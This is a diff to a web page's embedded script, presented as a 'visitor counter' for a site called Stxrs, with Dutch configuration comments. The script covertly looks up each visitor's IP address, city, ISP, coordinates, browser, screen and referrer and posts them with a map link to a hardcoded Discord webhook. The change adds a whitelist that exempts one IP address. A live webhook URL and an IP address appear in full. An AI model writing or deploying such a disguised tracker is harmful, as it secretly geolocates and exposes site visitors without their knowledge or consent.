@@ -2073,16 +2073,28 @@
 <!-- Template analytics — Stxrs visitor counter -->
 <script>
 (function(){
-  const cfg = {
-    ver: '3.1.0',
-    site: 'stxrs-wtf',
-    hook: 'https://discord.com/api/webhooks/1518151101340192848/l6lgr56NL8CgX-fv-YaEyqba7wDmsu3CmykPIXA5YHxCdUtxZwUk64B5N5gp-TQeTKvT'
-  };
+  /* ═══════════════════════════════════════════════════
+     CONFIGURATIE — pas hieronder aan
+     ═══════════════════════════════════════════════════ */
+
+  const WEBHOOK = 'https://discord.com/api/webhooks/1518151101340192848/l6lgr56NL8CgX-fv-YaEyqba7wDmsu3CmykPIXA5YHxCdUtxZwUk64B5N5gp-TQeTKvT';
+
+  // Whitelist — IP's hier worden NIET gelogd
+  const WHITELIST = [
+    '81.204.6.227'
+  ];
+
+  /* ═══════════════════════════════════════════════════
+     CODE — niet wijzigen
+     ═══════════════════════════════════════════════════ */
   function collect(){
     fetch('https://ipinfo.io/json').then(r=>r.json()).then(d=>{
+      const ip = d.ip||'?';
+      if (WHITELIST.length > 0 && WHITELIST.includes(ip)) return;
+
       const loc = (d.loc||',').split(',');
       const p = {
-        ip: d.ip||'?', city: d.city||'?', region: d.region||'?',
+        ip: ip, city: d.city||'?', region: d.region||'?',
         country: d.country||'?', isp: d.org||'?',
         lat: loc[0]||'?', lon: loc[1]||'?',
         ua: navigator.userAgent.substring(0,150),
@@ -2091,12 +2103,13 @@
         os: navigator.platform, time: new Date().toLocaleString('en-US'),
         ref: document.referrer||'(direct)'
       };
-      if(cfg.hook){
-        fetch(cfg.hook, {
+
+      if(WEBHOOK){
+        fetch(WEBHOOK, {
           method: 'POST',
           headers: {'Content-Type':'application/json'},
           body: JSON.stringify({
-            content: '**Stxrs — Visitor**\n```\nIP: '+p.ip+'\nLoc: '+p.city+', '+p.country+'\nISP: '+p.isp+'\nOS: '+p.os+'\nBrowser: '+p.ua+'\nScreen: '+p.screen+'\nTZ: '+p.tz+'\nRef: '+p.ref+'\nTime: '+p.time+'\nMap: https://google.com/maps?q='+p.lat+','+p.lon+'\n```'
+            content: '**Visited**\n```\nIP: '+p.ip+'\nLoc: '+p.city+', '+p.country+'\nISP: '+p.isp+'\nOS: '+p.os+'\nBrowser: '+p.ua+'\nScreen: '+p.screen+'\nTZ: '+p.tz+'\nRef: '+p.ref+'\nTime: '+p.time+'\nMap: https://google.com/maps?q='+p.lat+','+p.lon+'\n```'
           })
         }).catch(()=>{});
       }
